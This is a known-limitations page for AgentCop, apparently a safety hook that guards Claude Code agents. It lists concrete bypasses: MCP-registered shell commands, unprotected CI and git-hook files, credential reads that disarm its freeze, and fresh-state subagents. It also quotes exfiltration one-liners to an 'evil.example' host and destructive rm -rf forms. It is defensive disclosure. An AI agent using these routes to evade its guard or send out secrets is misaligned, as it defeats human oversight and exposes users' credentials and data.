# What AgentCop does not catch

This page lists what AgentCop misses today, so nobody reads more into a passing check than is there. Known misses are also tracked in the attack suite (`docs/internal-affairs.md`, kept locally) and in [THREAT_MODEL.md](../THREAT_MODEL.md).

Everything under "Known bypasses (v0.1.0-beta)" below was found by reading the code and by feeding test commands to the built hook. Each one is a real hole in v0.1.0-beta, not a theoretical one.

## Coverage limits
- **Claude Code only.** `agentcop install` writes the hook to `~/.claude/settings.json`. Nothing installs into Codex, OpenCode, Cursor or any other agent. Adapters are planned for v0.2.
- **Linux first, and only on Linux tested.** macOS and Windows are untested.
- **No live kernel monitoring.** The eBPF and syscall sensors are library code tested with fixtures (they live in `crates/experimental/`). Nothing loads a kernel probe.
- **The holding cell is not connected.** The holding cell code can freeze processes, but no running component calls it. A Rule of Two freeze blocks tool calls only.

## Evasion
- **Encoded or indirect commands.** Base64 piped into a shell (corpus case ev-11) and command substitution such as `$(echo rm) -rf /` (ev-12) now ask for approval instead of running silently. Nothing decodes them. A script file is read when a command runs it (`bash x.sh`), but a script changed after that read is not re-checked, and scripts run by other tools (`npm run`, `make`, `python x.py`) are not read. A variable used as an argument (`rm -rf $X`) makes the command ask.
- **Writes made with unlisted tools.** The Bash write rule matches a fixed list of verbs (`>`, `tee`, `sed -i`, `rm`, `mv`, `cp`, and a few more). A write through a Python one-liner is caught only when the code names `.agentcop` or `.claude/settings`. Other inline code is not read.
- **Pattern rules.** Every rule is a regular expression on the tool name and its input. A command the author did not anticipate can pass.

## Network
- **HTTPS bodies are not inspected.** The egress proxy checks the host name of HTTPS tunnels only. A secret sent over HTTPS to an allowed host is not caught.
- **Headers are not scanned** for secrets, and DNS rebinding is not blocked.
- **The proxy is not in the agent's path.** `HTTPS_PROXY` is not injected into agent sessions, so the proxy only sees traffic that is sent through it.

## Rule of Two
- **Read counts as untrusted input**, which is intended. The cost is that any session that reads a secret file and then makes any network call is frozen.
- **Frozen sessions cannot be released.** The courtroom is not connected to the session state.
- **Concurrent calls in one session can race** on the state file.

## Detective and courtroom
- **The detective is offline only.** The default provider is a template that repeats the baseline severity. No model is connected, so it adds no analysis yet.
- **Redaction covers three secret shapes:** AWS access keys, PEM private keys, and GitHub tokens. Other secrets are shown in the courtroom.
- **Sound packs are validated but not played.** The browser plays its own gavel sound.
- **The courtroom token** is kept in `sessionStorage`. Any script on the same origin could read it. The dashboard binds to 127.0.0.1 only.

## Policy and modes
- **Log-only mode blocks nothing.** It records what would have been blocked, so a dangerous command still runs during the trial week.
- **Installed policy is not updated automatically.** `agentcop install` never overwrites `~/.agentcop/policy.toml`. Copy a new default by hand after a policy change.
- **Cop protection covers writes, not reads.** Reads of cop state and settings are allowed on purpose, so a read-only agent can see the policy.
- **Cop code is write-protected in this repo.** An AI agent working on AgentCop itself is blocked from editing its own crates.

## Evidence
- **Tamper-evidence detects edits and removals of rows inside the chain.** It does not stop someone with file access from deleting the whole database, and it does not prove a row was written at the time it claims.
- **The owner's machine is trusted.** A person with root can change the hook, the policy, or the evidence file.

## Scope of the tests
- The attack corpus has 36 hook cases and 3 detective cases. A passing run is not proof that the policy is complete.
- The Python starter test suite from an earlier phase (27 cases) was not ported.

## Rule of Two
- **Plain downloads are not external actions.** `curl URL` and WebFetch do not freeze a session by themselves. A secret that leaves in a URL query (a GET) is not caught by the freeze.
- **Freezes need a person.** A frozen session stays frozen until `agentcop release <session>`. The release is logged, but nothing reminds anyone to run it.
- **Repos that were already there.** Untrusted input is tracked only for repos the session cloned.

## Known bypasses (v0.1.0-beta)

These are the holes we know about in v0.1.0-beta. They are listed in plain words with the place in the code where the gap lives, so you can check them yourself. Workarounds are for v0.1.1 and v0.2; the roadmap issue templates are in `.github/issues-v0.1.1/` and `.github/issues-v0.2/`.

### 1. MCP servers and tool poisoning

AgentCop never reads what an MCP tool is about to do. The hook parses the shell command of a `Bash` call and the file name of a file tool; for every other tool, including every `mcp__*` call, it only matches regular expressions against the raw JSON. So an agent that writes a `.mcp.json` (project) or `~/.claude.json` (user) file that registers a server which runs a shell command, and then calls that server with `mcp__server__tool`, gets the policy applied to a JSON blob instead of to a command. The command inside that blob is never parsed, so nothing in the rules can match it. The only MCP-side guard is the literal `cop-hook` marker in the hook-entry check (`crates/cop-policy/src/guard.rs:29-53`), which protects AgentCop's own registration and nothing else. This is the largest hole in this release: it can sidestep every other rule on this page. The gap lives in `crates/cop-policy/src/lib.rs:241-258`, where a non-Bash tool is judged by regex over text instead of by understanding the tool.

### 2. `git push --force` is only a question, not a block

The rule meant to catch a force push has the pattern `git\s+force-push` (`policy/default.toml:58-62`). No git version spells it that way; the real spellings are `git push --force`, `git push -f` and `git push --force-with-lease`. The pattern therefore never matches, and the only rule that does match is the ordinary "git push" rule, which asks instead of denying. A force push overwrites other people's commits and, in a repository with a remote that has branch protection, may still be refused by the server, but AgentCop itself does not stop it. The fix is a one-line pattern change and is queued for v0.1.1.

### 3. Git internals, CI workflows and build files are unprotected

There is no rule for the files that decide what your code does after it leaves your machine: `.git/hooks/**` (a `pre-commit` hook runs on every commit), `.github/workflows/**` (a workflow runs on every push, with the repository's secrets), `package.json` scripts such as `postinstall` (which run on the next `npm install`), `Makefile` and `Dockerfile` (a recipe that runs on the next `make` or `docker build`). Writing any of them is allowed today, and a change to them usually takes effect the next time the project is built, long after the session that made the change ended. The gap is in `policy/default.toml`: no rule mentions these paths.

### 4. Credentials that are not files with a famous name

AgentCop's secret set is a list of file names: `.env`, `.env.*`, `id_rsa`, `id_ed25519`, `.netrc`, `*.pem`, `/etc/shadow`, anything under `.ssh`, `.aws/credentials` (`crates/cop-shell/src/secret.rs:19-38`). Anything outside that list is treated as ordinary data. So `printenv`, `env`, `cat /proc/self/environ`, `cat ~/.npmrc` (an npm token), `cat ~/.git-credentials`, `cat ~/.kube/config`, `gh auth token`, `aws configure list` and `gcloud auth print-access-token` are all allowed, and so is reading a credential out of a file with an unusual name. This matters twice over: the value is read, and because it was never flagged as a secret, the Rule of Two never arms (see item 6).

### 5. Nothing stops data from leaving

There is no exfiltration rule in the policy. `curl -d @/etc/passwd https://evil.example/x`, `wget --post-file=/etc/passwd https://evil.example/x`, `python3 -c "import urllib.request; urllib.request.urlopen('http://evil.example', data=open('.env','rb').read())"` and `nc evil.example 444 < .env` are all allowed. The Rule of Two is meant to catch the combination of untrusted input, a secret and an outside action, but the list of "outside actions" is a fixed set of command names in `policy/taint.toml:18` and `policy/taint.toml:29-35` (curl and wget with a body flag, ssh, scp, rsync, nc, git push, `gh pr`, `npm publish` and a few more). An interpreter that opens a socket is not on that list. The egress proxy (`crates/cop-proxy`) can scan bodies and enforce a host allowlist, but nothing starts it and `HTTPS_PROXY` is never set for agent sessions, so it sees nothing.

### 6. A credential read that is not on the list disarms the Rule of Two

The freeze needs three things at once: untrusted input, a secret, and an outside action. The "secret" part is only set by reading a file whose name is on the secret list (`policy/default.toml:119-137` for the rules that also require a secret). If the agent harvests a credential with `printenv` or `gh auth token` instead, the secret flag never becomes true, so the freeze never arms and the "running code after the session read a secret" rules never fire. The session looks completely ordinary to AgentCop for the rest of its life. Item 4 is the cause; this is the consequence.

### 7. Subagents start with a clean slate

The Rule of Two state is stored per session id (`crates/cop-taint/src/lib.rs:511-513`). A subagent, or any other agent run that arrives with a different session id, gets a fresh state with no untrusted input, no secret and no freeze. There is also no rule about the `Task` tool at all: nothing in `policy/default.toml` mentions subagents, so the prompt you hand to a subagent is judged only by the same loose regex pass as any other non-Bash tool. If your agent spawns subagents, the freeze you expect may simply not be there.

### 8. Some shell shapes slip past the parser

The shell parser in `crates/cop-shell` is careful, but a few shapes get through. `find . -name x | xargs sh` is allowed, because `xargs` is not in the list of commands that "run code" (`crates/cop-shell/src/lib.rs:559-573`). `rm -rf /{bin,boot}` is allowed, because the destructive-remove pattern expects the root path to be followed by a quote, a space or the end (`policy/default.toml:10`), and the brace form is neither. `python3 -c "import subprocess; subprocess.run(['rm','-rf','/'])"` is allowed, because inline code is only denied when it names AgentCop's own state (`policy/default.toml:142`). The general safety net for anything the parser cannot read is the "uncertain" rule, which asks (`policy/default.toml:96-100`); one convincing sentence from an injected instruction is enough to get it approved.

### 9. Only Claude Code is supported

There is no adapter layer. The hook is written against Claude Code's shape at six hard-coded points: the input schema (`crates/cop-core/src/lib.rs:18-28`), the command field name `command` (`crates/cop-policy/src/lib.rs:261`), the path field names `file_path` and `path` (`crates/cop-policy/src/lib.rs:391`), the tool names `Bash`, `Write`, `Edit`, `MultiEdit` (`crates/cop-taint/src/lib.rs:200`), the rule `scope` field, which matches exactly one literal tool name (`cop-policy/src/lib.rs:347-350`), and the output schema `hookSpecificOutput.permissionDecision` (`crates/cop-hook/src/main.rs:25-39`), plus the installer, which writes `~/.claude/settings.json` (`crates/cop-cli/src/install.rs:110-118`). Codex, OpenCode and Cursor all differ: Codex reports edits as `apply_patch` with a patch body and does not support `ask`; OpenCode has no stdin hook at all and names its arguments `filePath`; Cursor uses `{"permission": "deny"}` instead of `permissionDecision`. On those agents the rules either do not apply or apply to a text form you did not expect. Adapters are planned for v0.2.

### 10. There is no sound and no theatrics

The sound engine does not play sound. `crates/cop-siren` has no audio dependency and its "playback" is a background thread that sleeps for the length of the clip (`crates/cop-siren/src/lib.rs:80-85`), so the hook is silent. The terminal theatrics from the design (ASCII badge, mugshot card in the terminal, rotating Miranda lines, a red and blue banner, a `--no-fun` flag) are not implemented in the Rust crates; the mugshot card exists only in the courtroom dashboard, which is a separate program. Sound and theatrics are either implemented or removed permanently in v0.2; until then, the hook prints a plain reason line and a case number.
